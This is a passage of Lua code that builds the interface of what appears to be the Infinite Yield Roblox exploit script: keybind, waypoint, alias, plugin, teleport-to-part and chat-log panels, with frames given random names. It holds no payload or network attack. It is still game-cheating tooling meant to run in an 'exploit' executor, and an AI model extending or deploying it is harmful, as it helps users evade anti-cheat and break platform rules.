	shadow_2.BorderSizePixel = 0
	shadow_2.Size = UDim2.new(0, 360, 0, 20)
	shadow_2.ZIndex = 10
	table.insert(shade2,shadow_2)

	PopupText_2.Name = "PopupText"
	PopupText_2.Parent = shadow_2
	PopupText_2.BackgroundTransparency = 1
	PopupText_2.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_2.ZIndex = 10
	PopupText_2.Font = Enum.Font.SourceSans
	PopupText_2.TextSize = 14
	PopupText_2.Text = "Set Keybinds"
	PopupText_2.TextColor3 = Color3.new(1, 1, 1)
	PopupText_2.TextWrapped = true
	table.insert(text1,PopupText_2)

	Exit_2.Name = "Exit"
	Exit_2.Parent = shadow_2
	Exit_2.BackgroundTransparency = 1
	Exit_2.Position = UDim2.new(1, -20, 0, 0)
	Exit_2.Size = UDim2.new(0, 20, 0, 20)
	Exit_2.Text = ""
	Exit_2.ZIndex = 10

	ExitImage_2.Parent = Exit_2
	ExitImage_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_2.BackgroundTransparency = 1
	ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_2.Image = "rbxassetid://5054663650"
	ExitImage_2.ZIndex = 10

	PositionsFrame.Name = "PositionsFrame"
	PositionsFrame.Parent = Settings
	PositionsFrame.Active = true
	PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PositionsFrame.BorderSizePixel = 0
	PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
	PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
	PositionsFrame.ZIndex = 10
	table.insert(shade1,PositionsFrame)

	Close_3.Name = "Close"
	Close_3.Parent = PositionsFrame
	Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_3.BorderSizePixel = 0
	Close_3.Position = UDim2.new(0, 205, 0, 150)
	Close_3.Size = UDim2.new(0, 40, 0, 20)
	Close_3.Font = Enum.Font.SourceSans
	Close_3.TextSize = 14
	Close_3.Text = "Close"
	Close_3.TextColor3 = Color3.new(1, 1, 1)
	Close_3.ZIndex = 10
	table.insert(shade2,Close_3)
	table.insert(text1,Close_3)

	Delete_5.Name = "Delete"
	Delete_5.Parent = PositionsFrame
	Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_5.BorderSizePixel = 0
	Delete_5.Position = UDim2.new(0, 50, 0, 150)
	Delete_5.Size = UDim2.new(0, 40, 0, 20)
	Delete_5.Font = Enum.Font.SourceSans
	Delete_5.TextSize = 14
	Delete_5.Text = "Clear"
	Delete_5.TextColor3 = Color3.new(1, 1, 1)
	Delete_5.ZIndex = 10
	table.insert(shade2,Delete_5)
	table.insert(text1,Delete_5)

	Part.Name = "PartGoto"
	Part.Parent = PositionsFrame
	Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Part.BorderSizePixel = 0
	Part.Position = UDim2.new(0, 5, 0, 150)
	Part.Size = UDim2.new(0, 40, 0, 20)
	Part.Font = Enum.Font.SourceSans
	Part.TextSize = 14
	Part.Text = "Part"
	Part.TextColor3 = Color3.new(1, 1, 1)
	Part.ZIndex = 10
	table.insert(shade2,Part)
	table.insert(text1,Part)

	Holder_4.Name = "Holder"
	Holder_4.Parent = PositionsFrame
	Holder_4.BackgroundTransparency = 1
	Holder_4.BorderSizePixel = 0
	Holder_4.Position = UDim2.new(0, 0, 0, 0)
	Holder_4.Selectable = false
	Holder_4.Size = UDim2.new(0, 250, 0, 145)
	Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.ScrollBarThickness = 0
	Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.VerticalScrollBarInset = 'Always'
	Holder_4.ZIndex = 10

	Example_4.Name = "Example"
	Example_4.Parent = PositionsFrame
	Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_4.BorderSizePixel = 0
	Example_4.Size = UDim2.new(0, 10, 0, 20)
	Example_4.Visible = false
	Example_4.Position = UDim2.new(0, 0, 0, -5)
	Example_4.ZIndex = 10
	table.insert(shade2,Example_4)

	Text_5.Name = "Text"
	Text_5.Parent = Example_4
	Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_5.BorderSizePixel = 0
	Text_5.Position = UDim2.new(0, 10, 0, 0)
	Text_5.Size = UDim2.new(0, 240, 0, 20)
	Text_5.Font = Enum.Font.SourceSans
	Text_5.TextSize = 14
	Text_5.Text = "Position"
	Text_5.TextColor3 = Color3.new(1, 1, 1)
	Text_5.TextXAlignment = Enum.TextXAlignment.Left
	Text_5.ZIndex = 10
	table.insert(shade2,Text_5)
	table.insert(text1,Text_5)

	Delete_6.Name = "Delete"
	Delete_6.Parent = Text_5
	Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_6.BorderSizePixel = 0
	Delete_6.Position = UDim2.new(0, 200, 0, 0)
	Delete_6.Size = UDim2.new(0, 40, 0, 20)
	Delete_6.Font = Enum.Font.SourceSans
	Delete_6.TextSize = 14
	Delete_6.Text = "Delete"
	Delete_6.TextColor3 = Color3.new(0, 0, 0)
	Delete_6.ZIndex = 10
	table.insert(shade3,Delete_6)
	table.insert(text2,Delete_6)

	TP.Name = "TP"
	TP.Parent = Text_5
	TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	TP.BorderSizePixel = 0
	TP.Position = UDim2.new(0, 155, 0, 0)
	TP.Size = UDim2.new(0, 40, 0, 20)
	TP.Font = Enum.Font.SourceSans
	TP.TextSize = 14
	TP.Text = "Goto"
	TP.TextColor3 = Color3.new(0, 0, 0)
	TP.ZIndex = 10
	table.insert(shade3,TP)
	table.insert(text2,TP)

	AliasesFrame.Name = "AliasesFrame"
	AliasesFrame.Parent = Settings
	AliasesFrame.Active = true
	AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	AliasesFrame.BorderSizePixel = 0
	AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
	AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
	AliasesFrame.ZIndex = 10
	table.insert(shade1,AliasesFrame)

	Close_2.Name = "Close"
	Close_2.Parent = AliasesFrame
	Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_2.BorderSizePixel = 0
	Close_2.Position = UDim2.new(0, 205, 0, 150)
	Close_2.Size = UDim2.new(0, 40, 0, 20)
	Close_2.Font = Enum.Font.SourceSans
	Close_2.TextSize = 14
	Close_2.Text = "Close"
	Close_2.TextColor3 = Color3.new(1, 1, 1)
	Close_2.ZIndex = 10
	table.insert(shade2,Close_2)
	table.insert(text1,Close_2)

	Delete_3.Name = "Delete"
	Delete_3.Parent = AliasesFrame
	Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_3.BorderSizePixel = 0
	Delete_3.Position = UDim2.new(0, 5, 0, 150)
	Delete_3.Size = UDim2.new(0, 40, 0, 20)
	Delete_3.Font = Enum.Font.SourceSans
	Delete_3.TextSize = 14
	Delete_3.Text = "Clear"
	Delete_3.TextColor3 = Color3.new(1, 1, 1)
	Delete_3.ZIndex = 10
	table.insert(shade2,Delete_3)
	table.insert(text1,Delete_3)

	Holder_3.Name = "Holder"
	Holder_3.Parent = AliasesFrame
	Holder_3.BackgroundTransparency = 1
	Holder_3.BorderSizePixel = 0
	Holder_3.Position = UDim2.new(0, 0, 0, 0)
	Holder_3.Size = UDim2.new(0, 250, 0, 145)
	Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.ScrollBarThickness = 0
	Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.VerticalScrollBarInset = 'Always'
	Holder_3.ZIndex = 10

	Example_3.Name = "Example"
	Example_3.Parent = AliasesFrame
	Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_3.BorderSizePixel = 0
	Example_3.Size = UDim2.new(0, 10, 0, 20)
	Example_3.Visible = false
	Example_3.ZIndex = 10
	table.insert(shade2,Example_3)

	Text_4.Name = "Text"
	Text_4.Parent = Example_3
	Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_4.BorderSizePixel = 0
	Text_4.Position = UDim2.new(0, 10, 0, 0)
	Text_4.Size = UDim2.new(0, 240, 0, 20)
	Text_4.Font = Enum.Font.SourceSans
	Text_4.TextSize = 14
	Text_4.Text = "honk"
	Text_4.TextColor3 = Color3.new(1, 1, 1)
	Text_4.TextXAlignment = Enum.TextXAlignment.Left
	Text_4.ZIndex = 10
	table.insert(shade2,Text_4)
	table.insert(text1,Text_4)

	Delete_4.Name = "Delete"
	Delete_4.Parent = Text_4
	Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_4.BorderSizePixel = 0
	Delete_4.Position = UDim2.new(0, 200, 0, 0)
	Delete_4.Size = UDim2.new(0, 40, 0, 20)
	Delete_4.Font = Enum.Font.SourceSans
	Delete_4.TextSize = 14
	Delete_4.Text = "Delete"
	Delete_4.TextColor3 = Color3.new(0, 0, 0)
	Delete_4.ZIndex = 10
	table.insert(shade3,Delete_4)
	table.insert(text2,Delete_4)

	PluginsFrame.Name = "PluginsFrame"
	PluginsFrame.Parent = Settings
	PluginsFrame.Active = true
	PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PluginsFrame.BorderSizePixel = 0
	PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
	PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
	PluginsFrame.ZIndex = 10
	table.insert(shade1,PluginsFrame)

	Close_4.Name = "Close"
	Close_4.Parent = PluginsFrame
	Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_4.BorderSizePixel = 0
	Close_4.Position = UDim2.new(0, 205, 0, 150)
	Close_4.Size = UDim2.new(0, 40, 0, 20)
	Close_4.Font = Enum.Font.SourceSans
	Close_4.TextSize = 14
	Close_4.Text = "Close"
	Close_4.TextColor3 = Color3.new(1, 1, 1)
	Close_4.ZIndex = 10
	table.insert(shade2,Close_4)
	table.insert(text1,Close_4)

	Add_3.Name = "Add"
	Add_3.Parent = PluginsFrame
	Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_3.BorderSizePixel = 0
	Add_3.Position = UDim2.new(0, 5, 0, 150)
	Add_3.Size = UDim2.new(0, 40, 0, 20)
	Add_3.Font = Enum.Font.SourceSans
	Add_3.TextSize = 14
	Add_3.Text = "Add"
	Add_3.TextColor3 = Color3.new(1, 1, 1)
	Add_3.ZIndex = 10
	table.insert(shade2,Add_3)
	table.insert(text1,Add_3)

	Holder_5.Name = "Holder"
	Holder_5.Parent = PluginsFrame
	Holder_5.BackgroundTransparency = 1
	Holder_5.BorderSizePixel = 0
	Holder_5.Position = UDim2.new(0, 0, 0, 0)
	Holder_5.Selectable = false
	Holder_5.Size = UDim2.new(0, 250, 0, 145)
	Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.ScrollBarThickness = 0
	Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.VerticalScrollBarInset = 'Always'
	Holder_5.ZIndex = 10

	Example_5.Name = "Example"
	Example_5.Parent = PluginsFrame
	Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_5.BorderSizePixel = 0
	Example_5.Size = UDim2.new(0, 10, 0, 20)
	Example_5.Visible = false
	Example_5.ZIndex = 10
	table.insert(shade2,Example_5)

	Text_6.Name = "Text"
	Text_6.Parent = Example_5
	Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_6.BorderSizePixel = 0
	Text_6.Position = UDim2.new(0, 10, 0, 0)
	Text_6.Size = UDim2.new(0, 240, 0, 20)
	Text_6.Font = Enum.Font.SourceSans
	Text_6.TextSize = 14
	Text_6.Text = "F4 > Toggle Fly"
	Text_6.TextColor3 = Color3.new(1, 1, 1)
	Text_6.TextXAlignment = Enum.TextXAlignment.Left
	Text_6.ZIndex = 10
	table.insert(shade2,Text_6)
	table.insert(text1,Text_6)

	Delete_7.Name = "Delete"
	Delete_7.Parent = Text_6
	Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_7.BorderSizePixel = 0
	Delete_7.Position = UDim2.new(0, 200, 0, 0)
	Delete_7.Size = UDim2.new(0, 40, 0, 20)
	Delete_7.Font = Enum.Font.SourceSans
	Delete_7.TextSize = 14
	Delete_7.Text = "Delete"
	Delete_7.TextColor3 = Color3.new(0, 0, 0)
	Delete_7.ZIndex = 10
	table.insert(shade3,Delete_7)
	table.insert(text2,Delete_7)

	PluginEditor.Name = randomString()
	PluginEditor.Parent = PARENT
	PluginEditor.BorderSizePixel = 0
	PluginEditor.Active = true
	PluginEditor.BackgroundTransparency = 1
	PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
	PluginEditor.Size = UDim2.new(0, 360, 0, 20)
	PluginEditor.ZIndex = 10

	background_3.Name = "background"
	background_3.Parent = PluginEditor
	background_3.Active = true
	background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_3.BorderSizePixel = 0
	background_3.Position = UDim2.new(0, 0, 0, 20)
	background_3.Size = UDim2.new(0, 360, 0, 160)
	background_3.ZIndex = 10
	table.insert(shade1,background_3)

	Dark_9.Name = "Dark"
	Dark_9.Parent = background_3
	Dark_9.Active = true
	Dark_9.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_9.BorderSizePixel = 0
	Dark_9.Position = UDim2.new(0, 222, 0, 0)
	Dark_9.Size = UDim2.new(0, 2, 0, 160)
	Dark_9.ZIndex = 10
	table.insert(shade2,Dark_9)

	Img.Name = "Img"
	Img.Parent = background_3
	Img.BackgroundTransparency = 1
	Img.Position = UDim2.new(0, 242, 0, 3)
	Img.Size = UDim2.new(0, 100, 0, 95)
	Img.Image = "rbxassetid://4113050383"
	Img.ZIndex = 10

	AddPlugin.Name = "AddPlugin"
	AddPlugin.Parent = background_3
	AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	AddPlugin.BorderSizePixel = 0
	AddPlugin.Position = UDim2.new(0, 235, 0, 100)
	AddPlugin.Size = UDim2.new(0, 115, 0, 50)
	AddPlugin.Font = Enum.Font.SourceSans
	AddPlugin.TextSize = 14
	AddPlugin.Text = "Add Plugin"
	AddPlugin.TextColor3 = Color3.new(1, 1, 1)
	AddPlugin.ZIndex = 10
	table.insert(shade2,AddPlugin)
	table.insert(text1,AddPlugin)

	FileName.Name = "FileName"
	FileName.Parent = background_3
	FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	FileName.BorderSizePixel = 0
	FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
	FileName.Size = UDim2.new(0, 200, 0, 50)
	FileName.Font = Enum.Font.SourceSans
	FileName.TextSize = 14
	FileName.Text = "Plugin File Name"
	FileName.TextColor3 = Color3.new(1, 1, 1)
	FileName.ZIndex = 10
	table.insert(shade2,FileName)
	table.insert(text1,FileName)

	About.Name = "About"
	About.Parent = background_3
	About.BackgroundTransparency = 1
	About.BorderSizePixel = 0
	About.Position = UDim2.new(0, 17, 0, 10)
	About.Size = UDim2.new(0, 187, 0, 49)
	About.Font = Enum.Font.SourceSans
	About.TextSize = 14
	About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
	About.TextColor3 = Color3.fromRGB(255, 255, 255)
	About.TextWrapped = true
	About.TextYAlignment = Enum.TextYAlignment.Top
	About.ZIndex = 10
	table.insert(text1,About)

	Directions_2.Name = "Directions"
	Directions_2.Parent = background_3
	Directions_2.BackgroundTransparency = 1
	Directions_2.BorderSizePixel = 0
	Directions_2.Position = UDim2.new(0, 17, 0, 60)
	Directions_2.Size = UDim2.new(0, 187, 0, 49)
	Directions_2.Font = Enum.Font.SourceSans
	Directions_2.TextSize = 14
	Directions_2.Text = "Type the name of the plugin file you want to add below."
	Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Directions_2.TextWrapped = true
	Directions_2.TextYAlignment = Enum.TextYAlignment.Top
	Directions_2.ZIndex = 10
	table.insert(text1,Directions_2)

	shadow_3.Name = "shadow"
	shadow_3.Parent = PluginEditor
	shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_3.BorderSizePixel = 0
	shadow_3.Size = UDim2.new(0, 360, 0, 20)
	shadow_3.ZIndex = 10
	table.insert(shade2,shadow_3)

	PopupText_3.Name = "PopupText"
	PopupText_3.Parent = shadow_3
	PopupText_3.BackgroundTransparency = 1
	PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_3.ZIndex = 10
	PopupText_3.Font = Enum.Font.SourceSans
	PopupText_3.TextSize = 14
	PopupText_3.Text = "Add Plugins"
	PopupText_3.TextColor3 = Color3.new(1, 1, 1)
	PopupText_3.TextWrapped = true
	table.insert(text1,PopupText_3)

	Exit_3.Name = "Exit"
	Exit_3.Parent = shadow_3
	Exit_3.BackgroundTransparency = 1
	Exit_3.Position = UDim2.new(1, -20, 0, 0)
	Exit_3.Size = UDim2.new(0, 20, 0, 20)
	Exit_3.Text = ""
	Exit_3.ZIndex = 10

	ExitImage_3.Parent = Exit_3
	ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_3.BackgroundTransparency = 1
	ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_3.Image = "rbxassetid://5054663650"
	ExitImage_3.ZIndex = 10

	AliasHint.Name = "AliasHint"
	AliasHint.Parent = AliasesFrame
	AliasHint.BackgroundTransparency = 1
	AliasHint.BorderSizePixel = 0
	AliasHint.Position = UDim2.new(0, 25, 0, 40)
	AliasHint.Size = UDim2.new(0, 200, 0, 50)
	AliasHint.Font = Enum.Font.SourceSansItalic
	AliasHint.TextSize = 16
	AliasHint.Text = "Add aliases by using the 'addalias' command"
	AliasHint.TextColor3 = Color3.new(1, 1, 1)
	AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	AliasHint.TextWrapped = true
	AliasHint.ZIndex = 10
	table.insert(text1,AliasHint)

	PluginsHint.Name = "PluginsHint"
	PluginsHint.Parent = PluginsFrame
	PluginsHint.BackgroundTransparency = 1
	PluginsHint.BorderSizePixel = 0
	PluginsHint.Position = UDim2.new(0, 25, 0, 40)
	PluginsHint.Size = UDim2.new(0, 200, 0, 50)
	PluginsHint.Font = Enum.Font.SourceSansItalic
	PluginsHint.TextSize = 16
	PluginsHint.Text = "Download plugins from the IY Discord (discord.io/infiniteyield)"
	PluginsHint.TextColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextWrapped = true
	PluginsHint.ZIndex = 10
	table.insert(text1,PluginsHint)

	PositionsHint.Name = "PositionsHint"
	PositionsHint.Parent = PositionsFrame
	PositionsHint.BackgroundTransparency = 1
	PositionsHint.BorderSizePixel = 0
	PositionsHint.Position = UDim2.new(0, 25, 0, 40)
	PositionsHint.Size = UDim2.new(0, 200, 0, 70)
	PositionsHint.Font = Enum.Font.SourceSansItalic
	PositionsHint.TextSize = 16
	PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
	PositionsHint.TextColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextWrapped = true
	PositionsHint.ZIndex = 10
	table.insert(text1,PositionsHint)

	ToPartFrame.Name = randomString()
	ToPartFrame.Parent = PARENT
	ToPartFrame.Active = true
	ToPartFrame.BackgroundTransparency = 1
	ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
	ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
	ToPartFrame.ZIndex = 10

	background_5.Name = "background"
	background_5.Parent = ToPartFrame
	background_5.Active = true
	background_5.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_5.BorderSizePixel = 0
	background_5.Position = UDim2.new(0, 0, 0, 20)
	background_5.Size = UDim2.new(0, 360, 0, 117)
	background_5.ZIndex = 10
	table.insert(shade1,background_5)

	ChoosePart.Name = "ChoosePart"
	ChoosePart.Parent = background_5
	ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ChoosePart.BorderSizePixel = 0
	ChoosePart.Position = UDim2.new(0, 100, 0, 55)
	ChoosePart.Size = UDim2.new(0, 75, 0, 30)
	ChoosePart.Font = Enum.Font.SourceSans
	ChoosePart.TextSize = 14
	ChoosePart.Text = "Select Part"
	ChoosePart.TextColor3 = Color3.new(1, 1, 1)
	ChoosePart.ZIndex = 10
	table.insert(shade2,ChoosePart)
	table.insert(text1,ChoosePart)

	CopyPath.Name = "CopyPath"
	CopyPath.Parent = background_5
	CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	CopyPath.BorderSizePixel = 0
	CopyPath.Position = UDim2.new(0, 185, 0, 55)
	CopyPath.Size = UDim2.new(0, 75, 0, 30)
	CopyPath.Font = Enum.Font.SourceSans
	CopyPath.TextSize = 14
	CopyPath.Text = "Copy Path"
	CopyPath.TextColor3 = Color3.new(1, 1, 1)
	CopyPath.ZIndex = 10
	table.insert(shade2,CopyPath)
	table.insert(text1,CopyPath)

	Directions_4.Name = "Directions"
	Directions_4.Parent = background_5
	Directions_4.BackgroundTransparency = 1
	Directions_4.BorderSizePixel = 0
	Directions_4.Position = UDim2.new(0, 51, 0, 17)
	Directions_4.Size = UDim2.new(0, 257, 0, 32)
	Directions_4.Font = Enum.Font.SourceSans
	Directions_4.TextSize = 14
	Directions_4.Text = 'Click on a part and then click the "Select Part" button below to set it as a teleport location'
	Directions_4.TextColor3 = Color3.new(1, 1, 1)
	Directions_4.TextWrapped = true
	Directions_4.TextYAlignment = Enum.TextYAlignment.Top
	Directions_4.ZIndex = 10
	table.insert(text1,Directions_4)

	Path.Name = "Path"
	Path.Parent = background_5
	Path.BackgroundTransparency = 1
	Path.BorderSizePixel = 0
	Path.Position = UDim2.new(0, 0, 0, 94)
	Path.Size = UDim2.new(0, 360, 0, 16)
	Path.Font = Enum.Font.SourceSansItalic
	Path.TextSize = 14
	Path.Text = ""
	Path.TextColor3 = Color3.new(1, 1, 1)
	Path.TextScaled = true
	Path.TextWrapped = true
	Path.TextYAlignment = Enum.TextYAlignment.Top
	Path.ZIndex = 10
	table.insert(text1,Path)

	shadow_4.Name = "shadow"
	shadow_4.Parent = ToPartFrame
	shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_4.BorderSizePixel = 0
	shadow_4.Size = UDim2.new(0, 360, 0, 20)
	shadow_4.ZIndex = 10
	table.insert(shade2,shadow_4)

	PopupText_5.Name = "PopupText"
	PopupText_5.Parent = shadow_4
	PopupText_5.BackgroundTransparency = 1
	PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_5.ZIndex = 10
	PopupText_5.Font = Enum.Font.SourceSans
	PopupText_5.TextSize = 14
	PopupText_5.Text = "Teleport to Part"
	PopupText_5.TextColor3 = Color3.new(1, 1, 1)
	PopupText_5.TextWrapped = true
	table.insert(text1,PopupText_5)

	Exit_4.Name = "Exit"
	Exit_4.Parent = shadow_4
	Exit_4.BackgroundTransparency = 1
	Exit_4.Position = UDim2.new(1, -20, 0, 0)
	Exit_4.Size = UDim2.new(0, 20, 0, 20)
	Exit_4.Text = ""
	Exit_4.ZIndex = 10

	ExitImage_5.Parent = Exit_4
	ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_5.BackgroundTransparency = 1
	ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_5.Image = "rbxassetid://5054663650"
	ExitImage_5.ZIndex = 10

	logs.Name = randomString()
	logs.Parent = PARENT
	logs.Active = true
	logs.BackgroundTransparency = 1
	logs.Position = UDim2.new(0, 0, 1, 10)
	logs.Size = UDim2.new(0, 338, 0, 20)
	logs.ZIndex = 10

	shadow.Name = "shadow"
	shadow.Parent = logs
	shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	shadow.BorderSizePixel = 0
	shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
	shadow.Size = UDim2.new(0, 338, 0, 20)
	shadow.ZIndex = 10
	table.insert(shade2,shadow)

	Hide.Name = "Hide"
	Hide.Parent = shadow
	Hide.BackgroundTransparency = 1
	Hide.Position = UDim2.new(1, -40, 0, 0)
	Hide.Size = UDim2.new(0, 20, 0, 20)
	Hide.ZIndex = 10
	Hide.Text = ""

	ImageLabel.Parent = Hide
	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Position = UDim2.new(0, 3, 0, 3)
	ImageLabel.Size = UDim2.new(0, 14, 0, 14)
	ImageLabel.Image = "rbxassetid://2406617031"
	ImageLabel.ZIndex = 10

	PopupText.Name = "PopupText"
	PopupText.Parent = shadow
	PopupText.BackgroundTransparency = 1
	PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
	PopupText.ZIndex = 10
	PopupText.Font = Enum.Font.SourceSans
	PopupText.FontSize = Enum.FontSize.Size14
	PopupText.Text = "Logs"
	PopupText.TextColor3 = Color3.new(1, 1, 1)
	PopupText.TextWrapped = true
	table.insert(text1,PopupText)

	Exit.Name = "Exit"
	Exit.Parent = shadow
	Exit.BackgroundTransparency = 1
	Exit.Position = UDim2.new(1, -20, 0, 0)
	Exit.Size = UDim2.new(0, 20, 0, 20)
	Exit.ZIndex = 10
	Exit.Text = ""

	ImageLabel_2.Parent = Exit
	ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_2.BackgroundTransparency = 1
	ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
	ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
	ImageLabel_2.Image = "rbxassetid://5054663650"
	ImageLabel_2.ZIndex = 10

	background.Name = "background"
	background.Parent = logs
	background.Active = true
	background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	background.BorderSizePixel = 0
	background.ClipsDescendants = true
	background.Position = UDim2.new(0, 0, 1, 0)
	background.Size = UDim2.new(0, 338, 0, 245)
	background.ZIndex = 10

	chat.Name = "chat"
	chat.Parent = background
	chat.Active = true
	chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	chat.BorderSizePixel = 0
	chat.ClipsDescendants = true
	chat.Size = UDim2.new(0, 338, 0, 245)
	chat.ZIndex = 10
	table.insert(shade1,chat)

	Clear.Name = "Clear"
	Clear.Parent = chat
	Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear.BorderSizePixel = 0
	Clear.Position = UDim2.new(0, 5, 0, 220)
	Clear.Size = UDim2.new(0, 50, 0, 20)
	Clear.ZIndex = 10
	Clear.Font = Enum.Font.SourceSans
	Clear.FontSize = Enum.FontSize.Size14
	Clear.Text = "Clear"
	Clear.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear)
	table.insert(text1,Clear)

	SaveChatlogs.Name = "SaveChatlogs"
	SaveChatlogs.Parent = chat
	SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	SaveChatlogs.BorderSizePixel = 0
	SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
	SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
	SaveChatlogs.ZIndex = 10
	SaveChatlogs.Font = Enum.Font.SourceSans
	SaveChatlogs.FontSize = Enum.FontSize.Size14
	SaveChatlogs.Text = "Save To .txt"
	SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,SaveChatlogs)
	table.insert(text1,SaveChatlogs)

	Toggle.Name = "Toggle"
	Toggle.Parent = chat
	Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle.BorderSizePixel = 0
	Toggle.Position = UDim2.new(0, 60, 0, 220)
	Toggle.Size = UDim2.new(0, 66, 0, 20)
	Toggle.ZIndex = 10
	Toggle.Font = Enum.Font.SourceSans
	Toggle.FontSize = Enum.FontSize.Size14
	Toggle.Text = "Disabled"
	Toggle.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle)
	table.insert(text1,Toggle)

	scroll_2.Name = "scroll"
	scroll_2.Parent = chat
	scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_2.BorderSizePixel = 0
	scroll_2.Position = UDim2.new(0, 5, 0, 25)
	scroll_2.Size = UDim2.new(0, 328, 0, 190)
	scroll_2.ZIndex = 10
	scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_2.ScrollBarThickness = 8
